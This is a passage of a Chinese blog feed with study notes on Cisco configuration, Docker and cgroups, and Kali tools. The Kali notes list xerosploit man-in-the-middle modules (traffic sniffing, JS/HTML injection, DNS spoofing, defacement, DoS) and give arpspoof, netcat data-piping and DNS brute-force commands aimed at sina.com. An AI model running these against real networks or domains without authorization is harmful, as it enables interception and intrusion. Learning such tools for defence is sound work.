id="虚拟端口配置（telnet）"><a href="#虚拟端口配置（telnet）" class="headerlink" title="虚拟端口配置（telnet）"></a>虚拟端口配置（telnet）</h4><pre><code>line vty 0 4password 123456login</code></pre><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><h4 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h4><pre><code>show ip route</code></pre><h4 id="路由接口ip配置"><a href="#路由接口ip配置" class="headerlink" title="路由接口ip配置"></a>路由接口ip配置</h4><pre><code>intface serial0/1ip address 192.168.1.1 255.255.255.0clock rate 64000（设置时钟）no shutdown</code></pre><h4 id="默认路由"><a href="#默认路由" class="headerlink" title="默认路由"></a>默认路由</h4><pre><code>ip route 0.0.0.0 0.0.0.0 下一跳</code></pre><h4 id="静态路由配置"><a href="#静态路由配置" class="headerlink" title="静态路由配置"></a>静态路由配置</h4><pre><code>ip route 目标网络ID 子网掩码 下一跳ip或设备出口的接口</code></pre><h4 id="RIP配置"><a href="#RIP配置" class="headerlink" title="RIP配置"></a>RIP配置</h4><pre><code>route ripnetwork 192.168.10.0（路由中的网段）network 192.168.20.0version 2no auto-summary</code></pre><h4 id="ospf配置"><a href="#ospf配置" class="headerlink" title="ospf配置"></a>ospf配置</h4><pre><code>route ospf 10（设置进程号）network 192.168.10.0 0.0.0.255 area 0（area设置区域号）network 192.168.20.0 0.0.0.255 area 0</code></pre><h4 id="nat配置"><a href="#nat配置" class="headerlink" title="nat配置"></a>nat配置</h4><pre><code>ip nat inside source static 192.168.1.1 172.16.1.1（静态ip转换）int f0/0ip nat insideint f0/1ip nat outside</code></pre><p>出口段连接的设备做ip route就好了</p><h4 id="DHCP配置"><a href="#DHCP配置" class="headerlink" title="DHCP配置"></a>DHCP配置</h4><pre><code>ip route pool aaa（定义地址池）network 192.168.1.0 255.255.255.0（动态分配）default-router 192.168.1.1（动态分配网关）dns-server 8.8.8.8（动态分配dns服务器地址）exitip dhcp excluded-address 192.168.1.100 192.168.1.110（排除的ip地址）ip helper-address 192.168.1.250（DHCP中继地址---向服务器请求分配DHCP地址）</code></pre><h4 id="ACL配置（acl编号取值范围（100-199））"><a href="#ACL配置（acl编号取值范围（100-199））" class="headerlink" title="ACL配置（acl编号取值范围（100-199））"></a>ACL配置<strong>（acl编号取值范围（100-199））</strong></h4><pre><code>access-list 101 deny host 192.168.1.10（拒绝ip为192.168.1.10的主机访问路由出口的主机）access-list 101 deny any（允许其他的流量访问）进入接口后ip access-group 101 in（将ACL应用与接口，生效ACL配置）</code></pre><p><strong>扩展ACL配置</strong>（配置完后记得用access-group生效配置）</p><pre><code>access-list 101 permit tcp 192.168.10.0 0.0.0.255 host 192.168.20.5 eq www|80（允许192.168.1.10的网段走tcp协议访问192.168.20.5的主机的万维网服务）补充acl编号取值范围（100-199）access-list 101 permit any any（允许其他网段访问）show access-list 101（查看ACL信息）</code></pre><h2 id="三层交换机配置"><a href="#三层交换机配置" class="headerlink" title="三层交换机配置"></a><strong>三层</strong>交换机配置</h2><h4 id="开启路由功能"><a href="#开启路由功能" class="headerlink" title="开启路由功能"></a>开启路由功能</h4><pre><code>ip routing</code></pre><h4 id="配置trunk并封装"><a href="#配置trunk并封装" class="headerlink" title="配置trunk并封装"></a>配置trunk并封装</h4><pre><code>switchport  trunk  encapsulation  dot1q switchport  mode  trunkno  switchport （进入真实接口）</code></pre><p>。</p><p>。。</p><p>。。。</p><p>。。。。</p><p>。。。。。</p><p>三次在我感觉就是多了路由功能的交换机，配置看上面的就好了</p><h4 id="单臂路由实例"><a href="#单臂路由实例" class="headerlink" title="单臂路由实例"></a>单臂路由实例</h4><p><img src="/root/blog/source/_posts/CISCO网络设备基本配置/2019-06-23-133111_637x821_scrot.png" srcset="/img/loading.gif" alt="图"></p><h5 id="SW1配置"><a href="#SW1配置" class="headerlink" title="SW1配置"></a>SW1配置</h5><pre><code>Switch&gt;enableSwitch#config terminalSwitch(config)#hostname SW1SW1(config)#vlan2 SW1(config-vlan)#exitSW1(config)vlan 3SW1(config-vlan)exitSW1(config)#interface fastEthernet 1/1SW1(config-if)#switchport mode access（配置接口为access口，科普除trunk模式外还有access、hybrid）SW1(config-if)#switchport access vlan 2SW1(config-if)#exitSW1(config)#interface fastEthernet 2/1SW1(config-if)#switchport mode accessSW1(config-if)#switchport access vlan 3SW1(config-if)#exitSW1(config)#interface fastEthernet 0/1SW1(config-if)#switchport mode trunkSW1(config-if)#switchport trunk allowed vlan 2,3（配置turnk口允许vlan2 和vlan3通过，除了vlan2和vlan3，其他所有的vlan默认拒绝所有，这里实验可加可不加）</code></pre><h5 id="R1配置"><a href="#R1配置" class="headerlink" title="R1配置"></a>R1配置</h5><pre><code>Switch&gt;enableSwtich#config terminalSwitch(config)#hostname R1R1(config)#interface fastEthernet 0/0R1(config-if)#no shutdownR1(config-if)#exitR1(config)#interface fastEthernet0/0.1R1(config-subif)#encapsulation dot1Q 2 R1(config-subif)#ip address 192.168.2.1 255.255.255.0R1(config-subif)#exitR1(config)#interface fastEthernet 0/0.2R1(config-subif)#encapsulation dot1Q 3R1(config-subif)#ip address 192.168.3.1 255.255.255.0</code></pre><h4 id="关于trunk、access、hybrid的理解"><a href="#关于trunk、access、hybrid的理解" class="headerlink" title="关于trunk、access、hybrid的理解"></a>关于trunk、access、hybrid的理解</h4><p>具有access性质的端口只能属于一个vlan，且端口不打tag</p><p>具有trunk性质的端口可以属于多个vlan，且端口都是打tag的</p><p>具有hubrid性质的端口可以属于多个vlan，是否打开tag由用户而定</p><p>tag的理解就想貼了同样标签的东西他们是可以互相通信的，比如小米手机用MIUI系统，而苹果手机用IOS系统</p>]]></content>
    
    
    <categories>
      
      <category>思科网络笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cisco</tag>
      
      <tag>基础网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker使用</title>
    <link href="/2019/03/14/Docker%E4%BD%BF%E7%94%A8/"/>
    <url>/2019/03/14/Docker%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>由于上篇有讲到关于docker的cgroup运维，这次就写一篇关于docker的基本使用吧。<br>还是说明一下，docker不同与物理的虚拟化，基于docker引擎运行一个容器，在仓库里拉取镜像每次容器之间互不干扰。<br>云计算比赛要求，这里使用的操作系统是centos7.</p><h2 id="首先安装docker及配置"><a href="#首先安装docker及配置" class="headerlink" title="首先安装docker及配置"></a>首先安装docker及配置</h2><pre><code>yum install -y docker | yum install -y docker-iovi /etc/sysconfig/docker</code></pre><h4 id="在配置文件最后添加"><a href="#在配置文件最后添加" class="headerlink" title="在配置文件最后添加"></a>在配置文件最后添加</h4><pre><code>ADD_REGISTRY=&#39;--add-registry 192.168.100.10:5000&#39;INSECURE_REGISTRY=&#39;--insecure-registry 192.168.100.10:5000&#39;</code></pre><a id="more"></a><p><strong>这里ip对应你的服务器ip</strong></p><h2 id="docker服务重启"><a href="#docker服务重启" class="headerlink" title="docker服务重启"></a>docker服务重启</h2><pre><code>systemctl daemon-reloadsystemctl restart docker</code></pre><h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h2><pre><code>docker info</code></pre><h2 id="添加本地镜像库"><a href="#添加本地镜像库" class="headerlink" title="添加本地镜像库"></a>添加本地镜像库</h2><pre><code>docker load -i &lt;镜像&gt; | docker load &lt; &lt;镜像&gt;docker imagesdocker tag &lt;image id&gt; &lt; 镜像仓库源:镜像标签 &gt;比如centos:latest</code></pre><p>上传镜像到docker仓库</p><pre><code>docker push centos:latest这样另一台pc就可以使用服务器的镜像了docker pull centos:latestdocker rmi &lt;image id&gt;(删除镜像)</code></pre><h2 id="有了镜像就可以运行容器了"><a href="#有了镜像就可以运行容器了" class="headerlink" title="有了镜像就可以运行容器了"></a>有了镜像就可以运行容器了</h2><pre><code>docker run -it --name centos centos:latest /bin/bash(这里是使用一个伪终端与容器进行互交)docker run -d --name centos centos:latest(这里是在后台运行容器并返回一个id)docker ps(查看已运行的容器)docker ps -a(查看所有容器)docker ps -aq(查看所有容器的id)配合docker rm ${docker ps -aq}使用可以删除所有的容器</code></pre><p>如果镜像正在运行要先关闭容器才行</p><pre><code>docker stop &lt;容器id&gt;</code></pre><h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><pre><code>docker attach &lt;容器id&gt; | docker exec -it centos /bin/bash</code></pre><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>构建镜像需要一个<strong>Dockerfile</strong>文件</p><p>比如这样(引用菜鸟教程的)</p><pre><code>runoob@runoob:~$ cat Dockerfile FROM    centos:6.7MAINTAINER      Fisher &quot;fisher@sudops.com&quot;RUN     /bin/echo &#39;root:123456&#39; |chpasswdRUN     useradd runoobRUN     /bin/echo &#39;runoob:123456&#39; |chpasswdRUN     /bin/echo -e &quot;LANG=\&quot;en_US.UTF-8\&quot;&quot; &gt;/etc/default/localEXPOSE  22EXPOSE  80CMD     /usr/sbin/sshd -D</code></pre><pre><code>docker build -t centos:latest .</code></pre><p>最近懒得截图所以就不发图片给大家看实例了。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>云计算</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker+cgroup运维</title>
    <link href="/2019/03/10/docker-cgroup%E8%BF%90%E7%BB%B4/"/>
    <url>/2019/03/10/docker-cgroup%E8%BF%90%E7%BB%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="CGroup-介绍"><a href="#CGroup-介绍" class="headerlink" title="CGroup 介绍"></a>CGroup 介绍</h2><p>CGroup 是 Control Groups 的缩写，是 Linux 内核提供的一种可以限制、记录、隔离进程组 (process groups) 所使用的物力资源 (如 cpu memory i/o 等等) 的机制。2007 年进入 Linux 2.6.24 内核，CGroups 不是全新创造的，它将进程管理从 cpuset 中剥离出来，作者是 Google 的 Paul Menage。CGroups 也是 LXC 为实现虚拟化所使用的资源管理手段。</p><a id="more"></a><p>blkio – 这个子系统为块设备设定输入/输出限制，比如物理设备（磁盘，固态硬盘，USB 等等）。<br>cpu – 这个子系统使用调度程序提供对 CPU 的 cgroup 任务访问。<br>cpuacct – 这个子系统自动生成 cgroup 中任务所使用的 CPU 报告。<br>cpuset – 这个子系统为 cgroup 中的任务分配独立 CPU（在多核系统）和内存节点。<br>devices – 这个子系统可允许或者拒绝 cgroup 中的任务访问设备。<br>freezer – 这个子系统挂起或者恢复 cgroup 中的任务。<br>memory – 这个子系统设定 cgroup 中任务使用的内存限制，并自动生成由那些任务使用的内存资源报告。<br>net_cls – 这个子系统使用等级识别符（classid）标记网络数据包，可允许 Linux 流量控制程序（tc）识别从具体 cgroup 中生成的数据包。</p><h5 id="设置开机自启并启动"><a href="#设置开机自启并启动" class="headerlink" title="(设置开机自启并启动)"></a>(设置开机自启并启动)</h5><pre><code>systemctl enable cgconfigsystemctl start cgconfigmount -l cgroup(查看cgroup挂载点)/sys/fs/cgroup</code></pre><h4 id="限制cpu实例"><a href="#限制cpu实例" class="headerlink" title="限制cpu实例"></a>限制cpu实例</h4><h5 id="控制一个进程的cpu资源分配"><a href="#控制一个进程的cpu资源分配" class="headerlink" title="控制一个进程的cpu资源分配"></a>控制一个进程的cpu资源分配</h5><pre><code>docker run -it 镜像id /bin/bashvi cpu.sh</code></pre><h6 id="bin-bash"><a href="#bin-bash" class="headerlink" title="!/bin/bash"></a>!/bin/bash</h6><p>i=0<br>while true<br>do<br>let i++<br>done</p><p>chmod +x cpu.sh<br>./cpu.sh</p><pre><code>top(查看脚本占用cpu的资源量)systemd-cgls(查看系统cgroup tree)</code></pre><h5 id="查看主要内容"><a href="#查看主要内容" class="headerlink" title="查看主要内容"></a>查看主要内容</h5><pre><code>─system.slice</code></pre><p>??├─systemd-machined.service<br>??│ └─4909 /usr/lib/systemd/systemd-machined<br>??├─docker-06e008e6ecec4f5c138e568c6b5b1659387a003b1cfb037c07006679db976d63.scope（容器）<br>??│ ├─4889 /bin/bash<br>??│ └─4982 /bin/bash ./cpu.sh</p><pre><code>cd /sys/fs/cgroup/cpu/system.slice/docker-06e008e6ecec4f5c138e568c6b5b1659387a003b1cfb037c07006679db976d63.scopeecho 50000&gt;cpu.cfs_quota_uscat cpu.cfs_quota_uscat cpu.cfs_period_us(相对于cpu.cfs_period_us的100000是50%)top(此时cpu占用率将近50%)</code></pre><p>容器cpu资源控制(弹性—加权)</p><pre><code>docker run -itd --cpu-shares 100 docker-io/centos:latestcat /sys/fs/cgroup/cpu/system.slice/docker-...(容器)/cpu.shares100</code></pre><p>因为是弹性的所以cpu-shares的值不能够确保一定能获得相对cpu资源，默认情况下cpu份额为1024，只有在多容器运行的时候，cpu加权才会有机会获得较多的cpu时间片给加权值大一点的容器，如果加权值多的容器处于空闲状态，那么比他少的容器也可以获得较多的时间片</p><h5 id="弹性分配实例"><a href="#弹性分配实例" class="headerlink" title="弹性分配实例"></a>弹性分配实例</h5><p>删除docker主机上运行的容器</p><pre><code>docker stop $(docker ps -aq)docker rm $(docker ps -aq)</code></pre><p>给一个容器分配cpu份额为1024</p><pre><code>docker run -it --rm --cpu-shares 1024 --cpuset-cpus 0 --name shares docker-io/centos:latest.</code></pre><h5 id="修改cpu份额"><a href="#修改cpu份额" class="headerlink" title="修改cpu份额"></a>修改cpu份额</h5><p>echo “512”&gt;/sys/fs/cgroup/cpu/system.slice/容器/cpu.shares</p><h4 id="cpu使用率"><a href="#cpu使用率" class="headerlink" title="cpu使用率"></a>cpu使用率</h4><p>cgroups 里，可以用 cpu.cfs_period_us 和 cpu.cfs_quota_us 来限制该组中的所有进程在单位时间里可以使用的 cpu 时间。cpu.cfs_period_us 就是时间周期，默认为 100000，即百毫 秒。cpu.cfs_quota_us就是在这期间内可使用的cpu时间，默认 -1，即无限制。</p><p>cpu.cfs_period_us：设定时间周期（单位为微秒（μs）），必须与 cfs_quota_us 配合使用。 cpu.cfs_quota_us ：设定周期内最多可使用的时间（单位为微秒（μs））。这里的配置指 task 对单个 cpu 的使用上限。</p><p>举个例子，如果容器进程需要每 1 秒使用单个 CPU 的 0.2 秒时间，可以将 cpu-period 设置随笔为<br>1000000（即 1 秒），cpu-quota 设置为 200000（0.2 秒）。<br>当然，在多核情况下，若 cfs_quota_us 是 cfs_period_us 的两倍，就表示在两个核上 完全使用 CPU，例如如果允许容器进程需要完全占用两个 CPU，则可以将 cpu-period 设置为 100000（即 0.1 秒），cpu-quota 设置为 200000（0.2 秒）。<br>实例同上，只是改为–cpu-period –cpu-quota而已</p><p>cpuset - CPU 绑定<br>对多核 CPU 的服务器，docker 还可以控制容器运行限定使用哪些 cpu 内核和内存节点，即 使用–cpuset-cpus 和–cpuset-mems 参数。对具有 NUMA 拓扑（具有多 CPU、多内存节点）的 服务器尤其有用，可以对需要高性能计算的容器进行性能最优的配置。如果服务器只有一个 内存节点，则–cpuset-mems 的配置基本上不会有明显效果</p><pre><code>docker run -itd --name rest --cpuset-cpus 0-2 docker.io/centos:latest</code></pre><p>cpuset.cpus：在这个文件中填写 cgroup 可使用的 CPU 编号，如 0-2,16 代表 0、1、2 和 16这 4 个 cpu。<br>cpuset.mems：与 CPU 类似，表示 cgroup 可使用的cpu内存块，格式同上<br>docker stats 容器名</p><h4 id="关于磁盘IO的分配"><a href="#关于磁盘IO的分配" class="headerlink" title="关于磁盘IO的分配"></a>关于磁盘IO的分配</h4><p>磁盘 IO 配额控制 主要包括以下参数：<br>–device-read-bps：限制此设备上的读速度（bytes per second），单位可以是 kb、mb 或者 gb。<br>–device-read-iops：通过每秒读 IO 次数来限制指定设备的读速度。<br>–device-write-bps ：限制此设备上的写速度（bytes per second），单位可以是 kb、mb 或者 gb。<br>–device-write-iops：通过每秒写 IO 次数来限制指定设备的写速度。<br>–blkio-weight：容器默认磁盘 IO 的加权值，有效值范围为 10-1000。<br>–blkio-weight-device： 针对特定设备的 IO 加权控制。其格式为 DEVICE_NAME:WEIGHT<br>这里就交给大家自己去实例了</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>云计算</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xerosploit框架使用</title>
    <link href="/2019/02/25/xerosploit%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/"/>
    <url>/2019/02/25/xerosploit%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="什么是xerosploit？"><a href="#什么是xerosploit？" class="headerlink" title="什么是xerosploit？"></a>什么是xerosploit？</h3><p>在我之前的文章中有介绍并且有安装教程，大家可以去翻一下，懒癌患者所以现在才更新。。。。<br>下面我们开始进行中间人框架的使用</p><pre><code>cd xerosploit./xerosploit.py</code></pre><a id="more"></a><p><img src="http://thyrsi.com/t6/673/1551066490x2890202761.png" srcset="/img/loading.gif" alt="开始"></p><pre><code>scan        映射你的网络iface        手动设置你的网络接口gateway        手动设置你的网关start        跳过扫描并直接设置目标IP地址rmlog        删除所有日志back        返回上一级help        显示帮助信息exit            关闭</code></pre><p>可以先用scan扫描当前局域网内的ip地址<br>也可以用自己扫到的</p><p><img src="/root/blog/source/_posts/xerosploit框架使用/start.png" srcset="/img/loading.gif" alt="start"></p><p>如果你是双网卡并且都连着网，你可以是指定用哪个网卡</p><p><img src="http://thyrsi.com/t6/673/1551066511x2890202761.png" srcset="/img/loading.gif" alt="设置网卡"></p><p>进入目标ip后也可以help查看可以使用的攻击模块</p><p><img src="http://thyrsi.com/t6/673/1551066528x2890202761.png" srcset="/img/loading.gif" alt="help2"></p><pre><code>pscan            端口扫描dos                对目标进行dos攻击ping            ping目标是否存活Injecthtml        将html注入到目标访问的网站中injectjs            将javascript注入到目标访问的网站中rdownload        替换目标下载的文件sniff            嗅探目标的流量dspoof            将所有http流量重定向到特定ipyplay            在目标的浏览器中后台播放youtube视频（需翻墙）replace            替换目标访问网站的所有图片driftnet            查看目标访问网站的所有图片move            让目标访问网站变得抖动deface            将目标访问网站的所有页面替换成自己定义的html代码</code></pre><h4 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h4><p><img src="http://thyrsi.com/t6/673/1551066546x2890202761.png" srcset="/img/loading.gif" alt="扫描端口"></p><h4 id="dos攻击"><a href="#dos攻击" class="headerlink" title="dos攻击"></a>dos攻击</h4><p><img src="http://thyrsi.com/t6/673/1551066562x2890202761.png" srcset="/img/loading.gif" alt="dos"></p><h4 id="ping存活"><a href="#ping存活" class="headerlink" title="ping存活"></a>ping存活</h4><p><img src="http://thyrsi.com/t6/673/1551066576x2890202761.png" srcset="/img/loading.gif" alt="ping"></p><h4 id="替换下载"><a href="#替换下载" class="headerlink" title="替换下载"></a>替换下载</h4><p><img src="http://thyrsi.com/t6/673/1551066591x2890202761.png" srcset="/img/loading.gif" alt="替换下载"></p><p>嗅探（与arpspoof类似，对目标ip进行抓包）<br>首先要开启流量转发才能使用</p><pre><code>echo &quot;1&quot;&gt; /proc/sys/net/ipv4/ip_forward</code></pre><p>顺便说一下arpspoof的使用好了<br>这个就是实现arp欺骗</p><pre><code>arp -i eth0 -t 192.168.1.4 192.168.1.2</code></pre><p>-i 指定你要使用的网卡-t 先输入目标ip 在输入攻击者ip，将自己伪装让该ip访问网站时先通过攻击这的ip<br>然后用抓包攻击看就可以了<br>ettercap -Tq eth0可以用这个<br>也可以使用wireshark</p><p><img src="http://thyrsi.com/t6/673/1551066608x2890202761.png" srcset="/img/loading.gif" alt="嗅探"></p><p><img src="http://thyrsi.com/t6/673/1551066621x2890202761.png" srcset="/img/loading.gif" alt="嗅探2"></p><h4 id="html注入"><a href="#html注入" class="headerlink" title="html注入"></a>html注入</h4><p><img src="http://thyrsi.com/t6/673/1551066635x2890202761.png" srcset="/img/loading.gif" alt="html注入"></p><p>run后是指定你创造的html，js注入同上</p><p>injectjs</p>]]></content>
    
    
    <categories>
      
      <category>Kali学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2019/02/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BBDNS/"/>
    <url>/2019/02/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BBDNS/</url>
    
    <content type="html"><![CDATA[<h3 id="DNS信息收集"><a href="#DNS信息收集" class="headerlink" title="DNS信息收集"></a>DNS信息收集</h3><p>收集信息前用nslookup或dig查看dns服务器信息（nslookup、dig自行百度）</p><h4 id="dns区域传输-一般查不到"><a href="#dns区域传输-一般查不到" class="headerlink" title="dns区域传输(一般查不到)"></a>dns区域传输(一般查不到)</h4><pre><code>dig @ns1.sina.com sina.com axfr</code></pre><pre><code>host -T -l sina.com ns1.sina.com</code></pre><a id="more"></a><h4 id="爆破新浪测试"><a href="#爆破新浪测试" class="headerlink" title="爆破新浪测试"></a>爆破新浪测试</h4><pre><code>dpkg -L fierce(查看fierce安装生成的文件)可以用这个查看工具自带的字典</code></pre><pre><code>fierce -dnsserver ns1.sina.com -dns sina.com.cn -wordlist /usr/share/fierce/hosts.txt(字典爆破前会前进行区域传输，失败后使用字典爆破)</code></pre><pre><code>dnsdict6 -d4(显示v4和v6的地址-d显示v6，-4显示v4) -t 16(指定线程数) -x sina.com(字典，其中字典强度从小到大排序-s,-m,-l,-x,-u)</code></pre><pre><code>dnsenum -f dns.txt(工具支持自动查找，所以可以不用加绝对路径) -dnsserver ns1.sina.com sina.com -o sina.xml</code></pre><pre><code>dnsmap sina.com -w dns.txt</code></pre><pre><code>dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt</code></pre><h4 id="dns注册信息"><a href="#dns注册信息" class="headerlink" title="dns注册信息"></a>dns注册信息</h4><pre><code>whois -H sina.com(省略法律信息)</code></pre><h3 id="邮件、主机信息"><a href="#邮件、主机信息" class="headerlink" title="邮件、主机信息"></a>邮件、主机信息</h3><pre><code>theharvester -d sina.com -l 300 -b google（用google需设置代理）</code></pre><h3 id="文件收集（通过google搜索，使用失败）"><a href="#文件收集（通过google搜索，使用失败）" class="headerlink" title="文件收集（通过google搜索，使用失败）"></a>文件收集（通过google搜索，使用失败）</h3><pre><code>metagoofil -d sina.com -t pdf -l 200 -o test -f 1.thml(此处找的是pdf文件)</code></pre><p>图形工具推荐使用maltego</p><h3 id="recon-ng框架使用"><a href="#recon-ng框架使用" class="headerlink" title="recon-ng框架使用"></a>recon-ng框架使用</h3><h4 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h4><pre><code>recon-ng -w sina(创建一个工作区)workspaces list(查看已有工作区)keys list(查看可以使用的网站api)keys add google_api asasasas(搜索引擎注册的api)(增加一个网站api)show options(全局设置与msf相同){有一个USER-AGENT要进行伪装set USER-AGENT ---(抓包浏览器找浏览器里的USER-AGENT)uset USER-AGENT(清除)</code></pre><h4 id="DNS与域名查询"><a href="#DNS与域名查询" class="headerlink" title="DNS与域名查询"></a>DNS与域名查询</h4><p>search google(搜索相关搜索引擎的模块)—当浏览器发现大量搜索信息后，有一段时间会被封杀暂时不能用该浏览器进行搜索信息<br>use …(使用模块)————不同搜索引擎得到的信息会有不一样，所以最好使用两到三个搜索引擎查找信息，不同引擎得到的相同信息不会被覆盖，只会添加新的信息。</p><h5 id="Google实例"><a href="#Google实例" class="headerlink" title="Google实例"></a>Google实例</h5><pre><code>use /recon/domains-hosts/google_site_web(使用google搜索)show info(查看介绍模块信息)show options(全局设置)set SOURCE sina.com(设置变量名)run(收集信息)show hosts(显示搜索到的信息)query select * from hosts(使用sql语句进行数据查询)query select * from hosts where host like &#39;%w%&#39;(查找含有w的信息)</code></pre><h4 id="search-brut-搜索字典爆破模块"><a href="#search-brut-搜索字典爆破模块" class="headerlink" title="search brut(搜索字典爆破模块)"></a>search brut(搜索字典爆破模块)</h4><pre><code>use recon/domains-hosts/brute_hostsshow optionsuse SOURCE sina.comuse WORDLIST /usr/share/recons-ng/data/hostnames.txt(这里使用的是recon-ng里的字典)run</code></pre><h5 id="解析IP地址-结合上面插到的域名"><a href="#解析IP地址-结合上面插到的域名" class="headerlink" title="解析IP地址(结合上面插到的域名)"></a>解析IP地址(结合上面插到的域名)</h5><pre><code>search resolveuse recon/hosts-hosts/resolveshow optionsset SOURCE query select host from hosts(解析查到所有域名的IP)set SOURCE query select host from where hosts where host like &#39;%w&amp;&#39;(解析hosts表里含w的域名的IP,不能使用*有空列解析会出错)runshow hosts</code></pre><h4 id="导出报告"><a href="#导出报告" class="headerlink" title="导出报告"></a>导出报告</h4><pre><code>search reportuse reporting/html(也可以导成其他的格式)show optionsset CREATOR lincso(设置创建人)set CUSTOMER lin(设置用户---给谁的报告)set FILENAME /root/Desktop/sina.html(修改保存的路径)run</code></pre><h4 id="备份快照（退出框架前建议使用）"><a href="#备份快照（退出框架前建议使用）" class="headerlink" title="备份快照（退出框架前建议使用）"></a>备份快照（退出框架前建议使用）</h4><pre><code>show schema(查看recon-ng里的数据表，搜索到的信息会放在这)snapshots take(生成快照)snapshots list(查看快照)snapshots load ...(恢复到快照)snapshots delete ...(删除快照)</code></pre>]]></content>
    
    
    <categories>
      
      <category>Kali学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcpdump小黑板抓包笔记</title>
    <link href="/2019/02/14/tcpdump%E5%B0%8F%E9%BB%91%E6%9D%BF%E6%8A%93%E5%8C%85/"/>
    <url>/2019/02/14/tcpdump%E5%B0%8F%E9%BB%91%E6%9D%BF%E6%8A%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<p> <strong>Linux、Unix默认安装了tcpdump</strong><br><strong>纯字符抓包工具</strong></p><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><pre><code>tcpdump -i eth0 -s 0 -w file.pcap(将抓包信息保存到file.pcap，从第0位开始---tcpdump默认只抓取前68个字节)</code></pre><pre><code>tcpdump -i eth0 port 22(只抓取端口是22的包)</code></pre><pre><code>tcpdump -r file.pcap(读取file.pcap的信息)</code></pre><a id="more"></a><h4 id="抓包筛选"><a href="#抓包筛选" class="headerlink" title="抓包筛选"></a>抓包筛选</h4><pre><code>tcpdump -n -r http.cap | awk &#39;{print $3}&#39; | sort -u(查看http.cap信息的第三列，不显示重复的IP---显示当前文件里所有的IP地址)</code></pre><pre><code>tcpdump -n src host 0.0.0.0 -r http.cap(查看来源IP是0.0.0.0的信息)src改为dst---目标IP</code></pre><pre><code>tcpdump -n port 53 -r http.cap(显示53端口的信息)</code></pre><pre><code>tcpdump -n tcp port 53 -r http.cap(显示53端口的tcp信息)</code></pre><pre><code>tcpdump -nX port 53 -r http.cap(16进制的方式显示53端口的信息)-A是ASCII码的方式显示</code></pre><h4 id="高级筛选"><a href="#高级筛选" class="headerlink" title="高级筛选"></a>高级筛选</h4><pre><code>tcpdump -An &#39;tcp[13]=24&#39; -r http.cap</code></pre><p>这里tcp[13]是指下图里的res.(保留位)，等于24就是对应控制位中的ACK、PSH两个标识位</p><p><a href="https://postimg.cc/9RvxsWqw" target="_blank" rel="noopener"><img src="https://i.postimg.cc/6qQD2qWc/2019-02-14-201718-1026x655-scrot.png" srcset="/img/loading.gif" alt="2019-02-14-201718-1026x655-scrot.png"></a></p><p><a href="https://www.cnblogs.com/bonelee/p/9077266.html" target="_blank" rel="noopener">TCP/IP详情信息参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Kali学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ncat瑞士军刀笔记</title>
    <link href="/2019/02/14/ncat%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/"/>
    <url>/2019/02/14/ncat%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/</url>
    
    <content type="html"><![CDATA[<h4 id="查看头文件"><a href="#查看头文件" class="headerlink" title="查看头文件"></a>查看头文件</h4><pre><code>nc -nv 0.0.0.0 IP地址 80 端口号(类telnet功能)head /</code></pre><p><strong>聊天功能(传输是明文)</strong><br><strong>nc相互传输文本信息(两台电脑实现类聊天功能)</strong></p><pre><code>A:nc -lp 4444(打开监听一个端口)B:nc -nv 0.0.0.0(目标IP) 4444</code></pre><a id="more"></a><h4 id="电子取证"><a href="#电子取证" class="headerlink" title="电子取证"></a>电子取证</h4><h5 id="文件收集"><a href="#文件收集" class="headerlink" title="文件收集"></a>文件收集</h5><pre><code>nc -lp 4444 &gt; ps.txt(将4444端口接受的信息直接传到ps.txt，可以当日志查看自己的端口是否有被入侵)ps aux | nc -nv 0.0.0.0 4444 -q 1(将进程信息发给4444端口一秒后退出)lsof(收集系统的所有打开文件的内容)</code></pre><h5 id="收集目录-将文件进行打包"><a href="#收集目录-将文件进行打包" class="headerlink" title="收集目录(将文件进行打包)"></a>收集目录(将文件进行打包)</h5><pre><code>tar -cvf - sublime/ | nc -lp 333 -q 1(nc -lp 333 -q1&lt;atr -cvf - sublime/)nc -nv 0.0.0.0 333 | tar -xvf -(nc -nv 0.0.0.0 333&gt;tar -xvf -)</code></pre><h4 id="加密传输文件"><a href="#加密传输文件" class="headerlink" title="加密传输文件"></a>加密传输文件</h4><pre><code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; aaa.txtmcrypt --flush -Fbqd -a rijndael-256 -m ecb &lt; 